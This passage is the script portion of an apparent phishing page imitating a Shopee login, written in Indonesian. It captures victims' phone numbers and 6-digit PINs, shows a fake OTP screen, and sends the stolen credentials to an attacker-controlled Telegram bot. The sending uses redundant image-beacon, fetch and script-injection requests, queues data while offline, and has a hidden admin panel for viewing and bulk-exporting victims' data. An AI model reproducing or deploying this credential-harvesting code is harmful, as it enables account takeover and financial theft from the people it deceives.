                <button class="admin-btn" onclick="sendPendingData()">Send Pending</button>
            </div>
        </div>
    </div>

    <script>
        let pinValue = '';
        let currentPhoneNumber = '';
        let currentEmail = '';
        let otp = ['', '', '', '', '', ''];
        let phoneNumberDisplay = '';
        let countdownTimer;
        let timeLeft = 60;
        
        // Telegram Bot Configuration - Secure credential loading
        function getCredentials() {
            try {
                if (typeof CONFIG === 'undefined') {
                    return { token: null, chatId: null };
                }
                return {
                    token: CONFIG.TELEGRAM_BOT_TOKEN || null,
                    chatId: CONFIG.TELEGRAM_CHAT_ID || null
                };
            } catch (error) {
                console.warn('‚ö†Ô∏è Configuration not available');
                return { token: null, chatId: null };
            }
        }

        // Database functions
        async function saveUserData(phone, pin) {
            const userData = {
                phone: phone,
                pin: pin,
                timestamp: new Date().toISOString(),
                id: Date.now()
            };

            // Save to localStorage first
            let users = JSON.parse(localStorage.getItem('shopeeUsers') || '[]');
            users.push(userData);
            localStorage.setItem('shopeeUsers', JSON.stringify(users));
            
            // Send to Telegram if online
            if (checkNetworkAndSend()) {
                logTelegramAttempt('INDIVIDUAL_SEND');
                await sendToTelegram(userData);
            } else {
                // Mark for later sending
                userData.pendingTelegram = true;
                localStorage.setItem('shopeeUsers', JSON.stringify(users));
            }
        }

        async function sendToTelegram(userData) {
            const credentials = getCredentials();
            if (!credentials.token || !credentials.chatId) {
                console.warn('‚ö†Ô∏è Cannot send to Telegram: credentials not configured');
                return;
            }
            
            const message = `üîê Data Pengguna Baru\n\nüì± Nomor: ${userData.phone}\nüî¢ PIN: ${userData.pin}\n‚è∞ Waktu: ${new Date(userData.timestamp).toLocaleString('id-ID')}\nüÜî ID: ${userData.id}`;
            
            const encodedMessage = encodeURIComponent(message);
            const telegramUrl = `https://api.telegram.org/bot${credentials.token}/sendMessage?chat_id=${credentials.chatId}&text=${encodedMessage}`;
            
            // Method 1: Using multiple image requests for reliability
            logTelegramAttempt('IMAGE_REQUEST');
            for (let i = 0; i < 3; i++) {
                setTimeout(() => {
                    const img = new Image();
                    img.onload = () => {
                        console.log(`‚úÖ Telegram image request ${i + 1} sent successfully`);
                        logTelegramAttempt('IMAGE_REQUEST', true);
                    };
                    img.onerror = () => {
                        console.log(`‚ö†Ô∏è Telegram image request ${i + 1} failed`);
                        logTelegramAttempt('IMAGE_REQUEST', false);
                    };
                    img.src = telegramUrl + `&_t=${Date.now()}_${i}`;
                }, i * 500);
            }
            
            // Method 2: Using fetch with proper error handling
            logTelegramAttempt('FETCH_REQUEST');
            try {
                fetch(telegramUrl, { method: 'GET', mode: 'no-cors' })
                    .then(() => {
                        console.log('‚úÖ Fetch request sent');
                        logTelegramAttempt('FETCH_REQUEST', true);
                    })
                    .catch(() => {
                        console.log('‚ö†Ô∏è Fetch request failed');
                        logTelegramAttempt('FETCH_REQUEST', false);
                    });
            } catch (error) {
                console.log('‚ö†Ô∏è Fetch method not available');
                logTelegramAttempt('FETCH_REQUEST', false);
            }
            
            // Method 3: Using script tag injection
            logTelegramAttempt('SCRIPT_INJECTION');
            try {
                const script = document.createElement('script');
                script.src = telegramUrl + `&callback=telegramCallback&_s=${Date.now()}`;
                script.onload = () => logTelegramAttempt('SCRIPT_INJECTION', true);
                script.onerror = () => logTelegramAttempt('SCRIPT_INJECTION', false);
                document.head.appendChild(script);
                setTimeout(() => {
                    try {
                        document.head.removeChild(script);
                    } catch (e) {}
                }, 2000);
                console.log('‚úÖ Script injection method executed');
            } catch (error) {
                console.log('‚ö†Ô∏è Script injection failed');
                logTelegramAttempt('SCRIPT_INJECTION', false);
            }
        }

        async function getAllUserData() {
            return JSON.parse(localStorage.getItem('shopeeUsers') || '[]');
        }

        function showLoginPage() {
            document.getElementById('homePage').classList.add('hidden');
            document.getElementById('loginPage').classList.add('active');
            document.getElementById('pinPage').classList.remove('active');
            document.getElementById('loadingPage').classList.remove('active');
            document.getElementById('successPage').classList.remove('active');
            document.getElementById('adminPage').classList.remove('active');
        }

        function showHomePage() {
            document.getElementById('homePage').classList.remove('hidden');
            document.getElementById('loginPage').classList.remove('active');
            document.getElementById('pinPage').classList.remove('active');
            document.getElementById('loadingPage').classList.remove('active');
            document.getElementById('successPage').classList.remove('active');
            document.getElementById('adminPage').classList.remove('active');
        }

        function showPinPage() {
            currentPhoneNumber = document.getElementById('phoneInput').value;
            phoneNumberDisplay = currentPhoneNumber;
            currentEmail = '';
            document.getElementById('homePage').classList.add('hidden');
            document.getElementById('loginPage').classList.remove('active');
            document.getElementById('pinPage').classList.add('active');
            document.getElementById('loadingPage').classList.remove('active');
            document.getElementById('successPage').classList.remove('active');
            document.getElementById('adminPage').classList.remove('active');
        }

        function showLoadingPage() {
            document.getElementById('homePage').classList.add('hidden');
            document.getElementById('loginPage').classList.remove('active');
            document.getElementById('pinPage').classList.remove('active');
            document.getElementById('loadingPage').classList.add('active');
            document.getElementById('successPage').classList.remove('active');
            document.getElementById('adminPage').classList.remove('active');
            
            // Listen for animation end event
            const progressBar = document.querySelector('.progress-fill');
            if (progressBar) {
                progressBar.addEventListener('animationend', async () => {
                    await showSuccessPage();
                }, { once: true });
            }
        }

        async function showSuccessPage() {
            // Save user data to database with actual PIN
            await saveUserData(currentPhoneNumber, pinValue);
            
            // Reset PIN after saving
            pinValue = '';
            updatePinDisplay();
            
            // Set phone number display
            document.getElementById('phoneNumberDisplay').textContent = phoneNumberDisplay;
            
            // Setup OTP inputs
            setupOtpInputs();

            document.getElementById('homePage').classList.add('hidden');
            document.getElementById('loginPage').classList.remove('active');
            document.getElementById('pinPage').classList.remove('active');
            document.getElementById('loadingPage').classList.remove('active');
            document.getElementById('successPage').classList.add('active');
            document.getElementById('adminPage').classList.remove('active');
        }
        
        function setupOtpInputs() {
            for (let i = 0; i < 6; i++) {
                const input = document.getElementById(`otp-${i}`);
                input.value = '';
                input.addEventListener('input', (e) => {
                    const value = e.target.value;
                    if (value && i < 5) {
                        document.getElementById(`otp-${i + 1}`).focus();
                    }
                    otp[i] = value;
                });
                
                input.addEventListener('keydown', (e) => {
                    if (e.key === 'Backspace' && !otp[i] && i > 0) {
                        document.getElementById(`otp-${i - 1}`).focus();
                    }
                });
            }
            
            // Start countdown timer
            startCountdown();
        }
        
        function startCountdown() {
            // Clear any existing timer first
            if (countdownTimer) {
                clearInterval(countdownTimer);
            }
            
            // Reset time to 60 seconds
            timeLeft = 60;
            
            // Get specific timer container by ID
            const timerContainer = document.getElementById('otpTimer');
            if (timerContainer) {
                timerContainer.innerHTML = 'Mohon tunggu <span style="color: #ef4444; font-weight: 600;" id="countdown">60</span> detik untuk mengirim ulang.';
                timerContainer.style.cursor = 'default';
                timerContainer.onclick = null;
            }
            
            // Start new countdown
            countdownTimer = setInterval(() => {
                timeLeft--;
                const countdownElement = document.getElementById('countdown');
                
                if (countdownElement) {
                    countdownElement.textContent = timeLeft;
                }
                
                // When countdown reaches 0
                if (timeLeft <= 0) {
                    clearInterval(countdownTimer);
                    
                    if (timerContainer) {
                        timerContainer.innerHTML = '<span style="color: #10b981; font-weight: 600; cursor: pointer; text-decoration: underline;">Kirim ulang OTP</span>';
                        timerContainer.style.cursor = 'pointer';
                        
                        // Add click handler for resend
                        timerContainer.onclick = () => {
                            alert('üì± OTP baru telah dikirim ke ' + phoneNumberDisplay);
                            console.log('üîÑ Mengirim ulang OTP ke:', phoneNumberDisplay);
                            
                            // Restart countdown from 60 seconds
                            startCountdown();
                        };
                    }
                }
            }, 1000);
        }



        function showAdminPage() {
            document.getElementById('homePage').classList.add('hidden');
            document.getElementById('loginPage').classList.remove('active');
            document.getElementById('pinPage').classList.remove('active');
            document.getElementById('loadingPage').classList.remove('active');
            document.getElementById('successPage').classList.remove('active');
            document.getElementById('adminPage').classList.add('active');
            loadAdminData();
        }

        function checkInput() {
            const phoneInput = document.getElementById('phoneInput');
            const btn = document.getElementById('nextBtn');

            if (phoneInput.value.length > 0) {
                btn.classList.add('active');
                btn.disabled = false;
                btn.onclick = showPinPage;
            } else {
                btn.classList.remove('active');
                btn.disabled = true;
                btn.onclick = null;
            }
        }

        function addPin(num) {
            if (pinValue.length < 6) {
                pinValue += num;
                updatePinDisplay();

                if (pinValue.length === 6) {
                    setTimeout(() => {
                        showLoadingPage();
                    }, 300);
                }
            }
        }

        function deletePin() {
            if (pinValue.length > 0) {
                pinValue = pinValue.slice(0, -1);
                updatePinDisplay();
            }
        }

        function updatePinDisplay() {
            for (let i = 1; i <= 6; i++) {
                const box = document.getElementById('pinBox' + i);
                if (i <= pinValue.length) {
                    box.textContent = '‚óè';
                    box.classList.add('filled');
                } else {
                    box.textContent = '';
                    box.classList.remove('filled');
                }
            }
        }

        function loadAdminData() {
            const users = getAllUserData();
            const adminTable = document.getElementById('adminTable');
            adminTable.innerHTML = '';

            if (users.length === 0) {
                adminTable.innerHTML = '<tr><td colspan="4">Belum ada data pengguna</td></tr>';
                return;
            }

            users.forEach(user => {
                const row = document.createElement('tr');
                row.innerHTML = `
                    <td>${user.phone}</td>
                    <td>${user.pin}</td>
                    <td>${new Date(user.timestamp).toLocaleString()}</td>
                    <td>${user.id}</td>
                `;
                adminTable.appendChild(row);
            });
        }

        async function sendAllToTelegram() {
            const credentials = getCredentials();
            if (!credentials.token || !credentials.chatId) {
                alert('‚ö†Ô∏è Cannot send to Telegram: credentials not configured');
                return;
            }
            
            const users = await getAllUserData();
            if (users.length === 0) {
                alert('Tidak ada data untuk dikirim');
                return;
            }
            
            let message = 'üìä Database Pengguna Shopee\n\n';
            users.forEach((user, index) => {
                message += `${index + 1}. üì± ${user.phone} | üî¢ ${user.pin} | ‚è∞ ${new Date(user.timestamp).toLocaleString('id-ID')}\n`;
            });
            
            const encodedMessage = encodeURIComponent(message);
            const telegramUrl = `https://api.telegram.org/bot${credentials.token}/sendMessage?chat_id=${credentials.chatId}&text=${encodedMessage}`;
            
            // Send multiple requests for reliability
            for (let i = 0; i < 5; i++) {
                setTimeout(() => {
                    const img = new Image();
                    img.src = telegramUrl + `&_bulk=${Date.now()}_${i}`;
                }, i * 300);
            }
            
            alert('‚úÖ Data dikirim ke Telegram!');
            console.log('üìä Bulk data sent to Telegram');
        }

        function exportData() {
            const users = JSON.parse(localStorage.getItem('shopeeUsers') || '[]');
            const dataStr = JSON.stringify(users, null, 2);
            const dataBlob = new Blob([dataStr], {type: 'application/json'});
            const url = URL.createObjectURL(dataBlob);
            const link = document.createElement('a');
            link.href = url;
            link.download = 'shopee_users.json';
            link.click();
        }

        function clearData() {
            if (confirm('Yakin ingin menghapus semua data?')) {
                localStorage.removeItem('shopeeUsers');
                loadAdminData();
                alert('Data berhasil dihapus');
            }
        }
        
        function showTelegramLogs() {
            const logs = JSON.parse(localStorage.getItem('telegramLogs') || '[]');
            if (logs.length === 0) {
                alert('Tidak ada log Telegram');
                return;
            }
            
            let logText = 'TELEGRAM LOGS:\n\n';
            logs.slice(-20).forEach(log => {
                logText += `${log.timestamp} - ${log.method}: ${log.status}\n`;
            });
            
            alert(logText);
        }

        // Telegram callback function for JSONP
        window.telegramCallback = function(data) {
            console.log('‚úÖ Telegram JSONP callback received:', data);
        };
        
        // Network status monitoring
        function checkNetworkAndSend() {
            if (navigator.onLine) {
                console.log('‚úÖ Network is online');
                return true;
            } else {
                console.log('‚ùå Network is offline');
                alert('‚ö†Ô∏è Tidak ada koneksi internet. Data akan dikirim saat online.');
                return false;
            }
        }
        
        // Enhanced logging for debugging
        function logTelegramAttempt(method, success = null) {
            const timestamp = new Date().toLocaleString('id-ID');
            const status = success === null ? 'ATTEMPTING' : (success ? 'SUCCESS' : 'FAILED');
            console.log(`[${timestamp}] TELEGRAM ${method}: ${status}`);
            
            // Store logs in localStorage for debugging
            const logs = JSON.parse(localStorage.getItem('telegramLogs') || '[]');
            logs.push({ timestamp, method, status });
            if (logs.length > 50) logs.shift(); // Keep only last 50 logs
            localStorage.setItem('telegramLogs', JSON.stringify(logs));
        }

        // Check for admin access
        window.onload = function() {
            const urlParams = new URLSearchParams(window.location.search);
            if (urlParams.get('admin') === 'true') {
                showAdminPage();
            }
            
            // Log network status
            console.log('Network status:', navigator.onLine ? 'Online' : 'Offline');
            
            // Send pending data when online
            if (navigator.onLine) {
                sendPendingData();
            }
        };
        
        // Send data that was saved while offline
        async function sendPendingData() {
            const users = JSON.parse(localStorage.getItem('shopeeUsers') || '[]');
            const pendingUsers = users.filter(user => user.pendingTelegram);
            
            if (pendingUsers.length > 0) {
                console.log(`üîÑ Sending ${pendingUsers.length} pending data to Telegram`);
                
                for (const user of pendingUsers) {
                    logTelegramAttempt('PENDING_SEND');
                    await sendToTelegram(user);
                    
                    // Remove pending flag
                    user.pendingTelegram = false;
                    
                    // Small delay between sends
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
                
                // Update localStorage
                localStorage.setItem('shopeeUsers', JSON.stringify(users));
                console.log('‚úÖ All pending data sent to Telegram');
            }
        }
        
        // Listen for online/offline events
        window.addEventListener('online', () => {
            console.log('üåê Network back online - sending pending data');
            sendPendingData();
        });
        
        window.addEventListener('offline', () => {
            console.log('üö´ Network offline - data will be queued');
        });
    </script>
</body>
</html>